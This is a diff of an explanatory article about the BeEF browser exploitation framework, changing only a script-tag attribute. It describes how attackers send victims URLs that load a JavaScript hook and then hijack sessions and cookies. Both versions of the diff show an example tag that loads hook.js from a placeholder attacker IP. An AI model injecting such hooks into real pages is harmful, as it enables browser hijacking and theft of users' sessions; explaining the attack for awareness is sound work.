@@ -4,7 +4,7 @@ According to [1][1] around 45% of Web users are not updating to the latest versi
 ## What Does BeEF Do?
 BeEF evades network security measures and anti-virus applications in the host system by exploiting vulnerabilities in web browsers [3][3]. It focuses on taking advantage of a web browser’s vulnerabilities to hijack and take control of the target. By “hooking” one or many number of browsers, the attacker starts launching various type of commands that attacks the browser and further attacks the system [3][3]. In order to perform an attack, the attacker generates a customized URL that includes a JavaScript hook and forwards it to the targeted user using emails, social network links and many other possible ways to open it [4]. 
 ```javascript
-<script src="http://{ATTACKER’S IP}:3000/hook.js" type="text/javascript"></script>
+<script src="http://{ATTACKER’S IP}:3000/hook.js"></script>
 ```
 Once an unaware user opens the received URL, the browser is hooked without noticing any unusual activity while the attacker accesses the user’s session. Hence, the attacker will have access to the targeted browser and will be able to launch MITM attacks, Social Engineering attacks, Phishing, Cookie Hijacking, Webcam Enabling, Information Gathering, and many other commands that may further attack the host system.
 ## How Does It Work?
